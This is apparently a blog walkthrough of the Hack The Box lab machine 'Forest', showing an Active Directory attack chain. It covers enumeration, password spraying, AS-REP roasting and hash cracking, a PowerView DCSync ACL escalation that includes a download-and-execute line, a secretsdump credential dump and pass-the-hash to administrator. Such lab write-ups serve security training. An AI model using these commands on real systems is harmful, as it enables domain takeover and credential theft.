---
title: HTB -- Forest
date: 2022-01-20
layout: single
header:
  teaser: assets/images/htb/forest/teaser.png
excerpt: The best beginner box for learning AD methods! Shows off AS_REP roasting as well as a challenging manual privesc with Bloodhound.
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - kerberos
  - ad
---

### Summary
![](/assets/images/htb/forest/teaser.png)

Forest is a great box to start learning AD methods with. It first teaches AS_REP roasting on a service user, giving us a hash. John cracks this hash allowing us to login. From there we get the user flag and perform further AD enumeration with various methodologies. With Bloodhound we dig and find an ACL Privesc with writeall? leading to root with some powershell commands or the thrifty aclpwn.


### Nmap

```
# Nmap 7.91 scan initiated Wed Dec  8 18:41:09 2021 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/HTB/f
orest/results/forest.htb/scans/_quick_tcp_nmap.txt -oX /home/kali/HTB/forest/results/forest.htb/scans/xml/_quick_tcp_nma
p.xml forest.htb                                                                                                        
Warning: Hostname forest.htb resolves to 2 IPs. Using 10.10.10.161.                         
Nmap scan report for forest.htb (10.10.10.161)
Host is up, received user-set (0.013s latency).
Other addresses for forest.htb (not scanned): 10.10.10.161
Scanned at 2021-12-08 18:41:09 EST for 61s
Not shown: 992 closed ports
Reason: 992 conn-refused
PORT    STATE SERVICE      REASON  VERSION
88/tcp  open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2021-12-08 23:54:33Z)
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-
Name)
445/tcp open  microsoft-ds syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp open  kpasswd5?    syn-ack
593/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped   syn-ack
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
```


* SMB
  * `smbmap -u "" -p "" -P 445 -H 10.10.10.161 && smbmap -u "guest" -p "" -P 445 -H 10.10.10.161`
  * `smbclient -U '%' -L //10.10.10.161 && smbclient -U 'guest%' -L //`
  * enum4linux
    * &#x20;`enum4linux -a 10.10.10.161`
    * `Loot: Username list`
* LDAP
  * `nmap -n -sV --script "ldap* and not brute" -p 389 10.10.10.161`
  * Great information about the domain



### Password Spraying

This attack is loud, slow, and mainly targets password reuse or username = password cases. Due to this it's best saved for lateral movement but worth a shot to attempt if you have a username list.

```
crackmapexec smb 10.10.10.161 -u users-clean.txt -p passwords.txt                                           
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb
.local) (signing:True) (SMBv1:True)                                                                                     
SMB         10.10.10.161    445    FOREST           [-] htb.local\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.10.10.161    445    FOREST           [-] htb.local\Administrator:Guest STATUS_LOGON_FAILURE 
SMB         10.10.10.161    445    FOREST           [-] htb.local\Administrator:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.10.161    445    FOREST           [-] htb.local\Administrator:DefaultAccount STATUS_LOGON_FAILURE 
SMB         10.10.10.161    445    FOREST           [-] htb.local\Administrator:sebastien STATUS_LOGON_FAILURE 
SMB         10.10.10.161    445    FOREST           [-] htb.local\Administrator:lucinda STATUS_LOGON_FAILURE 
```

### AS\_REP roasting

```
for user in `cat ~/HTB/forest/users.txt`; do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user}; done
...
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:ca051453174ea08075d2ae765b9ca393$36f0929da1381b02546d9848f68d870bf5d77c10b0641fbcec7edab1
baa18b819a6d61ab372db4b5cff49c3819719728c9c3c46d11e763b0b44cf20819e141bbb7eff48cf69cbb7cf3516de0c60c95b978bb78731efda920
838c97defa81c6fd329553fb44620c380ca377e1b89bd799df83d2d94134a2abc0c1c1b970940f26e120799e9c63f1dd3052122d9f56ea79833df520
cc3baadf705c5ac3a3eb970ffab153f882516bdcf5e9db5f2b14d6a05a45f0397c942219f6c3ffa797ca0a8c03bd790a12b6b8c8f9cff9ee9f8c3c8b
3a49a3b482fb529269a384f9a635d105

```

### Cracking the hash

John gives us the password `s3rvice` found in rockyou. Note that john can be finnicky and things like trailing whitespace or extra empty lines can really mess up it's ability to detect what kind of hash it's cracking.

```
john roastme.txt --wordlist=~/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB)
1g 0:00:00:02 DONE (2022-01-07 09:08) 0.3663g/s 1496Kp/s 1496Kc/s 1496KC/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Enumeration as svc\_alfresco

Just connect with evilwinrm and begin the enumeration process

```
ruby ~/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

Upload sharphound and download it's contents. For time efficiency can search through the Bloodhound dataset while a program like `winpeas` scans the system.

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /home/kali/HTB/forest/SharpHound.exe
Info: Uploading /home/kali/HTB/forest/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe

                                                             
Data: 1110696 bytes of 1110696 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ./SharpHound.exe
----------------------------------------------
Initializing SharpHound at 6:27 AM on 1/7/2022
----------------------------------------------

Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain HTB.LOCAL using path CN=Schema,CN=Configuration,DC=htb,DC=local
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 21 MB RAM
Status: 123 objects finished (+123 61.5)/s -- Using 28 MB RAM
Enumeration finished in 00:00:02.4490516
Compressing data to .\20220107062739_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 6:27 AM on 1/7/2022! Happy Graphing!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20220107062739_BloodHound.zip
Info: Downloading 20220107062739_BloodHound.zip to ./20220107062739_BloodHound.zip

                                                             
Info: Download successful!
```

## Bloodhound

* Mark owned users as owned
*   Click queries till you find something interesting
    * In this case -- `find shortest path to domain admins` stands out

![](/assets/images/htb/forest/bloodhound-graph-view.png)

We can hop from `svc_alfresco` with a few moves. Since alfresco is a member of `account_operators`, can abuse `WriteDacl` to escalate privalages. For aid on how to do this, you can right click help on any single connection for more information.

![](/assets/images/htb/forest/bloodhound-hint.png)

### ACL Privesc

Access control list configuration allows for a lateral movement through AD object permissions.&#x20;


Bloodhound describes the attack as follows, assuming you have sourced PowerView.ps1 into the environment.

1. Source PowerView
   1. `IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8081/PowerView.ps1')`
2. Add a password
3. Add a PScredential Object
4. Escalate privalages by adding DCSync rights to your new user

```
# Provided Example
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync

# Actual Attack
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.24:8081/PowerView.ps1')
$pass = convertto-securestring 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
```

This attack is very finnicky so trial and error is key, especially with the TargetIdentity field. When in doubt, always read the PowerView docs


Note that Oxdf's writeup has a great oneliner version of this if needed in a pinch:

```
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

Once completed, verify that svc-alfresco is added to the group

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group 'Exchange Windows Permissions'
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
svc-alfresco
The command completed successfully.
```

For an unknown reason svc-alfresco would get removed from this group every few minutes which would make secretsdump.py fail due to a lack of permissions.&#x20;

```
secretsdump.py svc-alfresco:s3rvice@10.10.10.161     
                                                               
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
                                                                                                                        
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                              
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                   
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                    
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                         
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                
```

With the administrators hash in hand, we can pass the hash for a free shell as root!

```
ruby ~/evil-winrm/evil-winrm.rb -i 10.10.10.161 -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6     

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

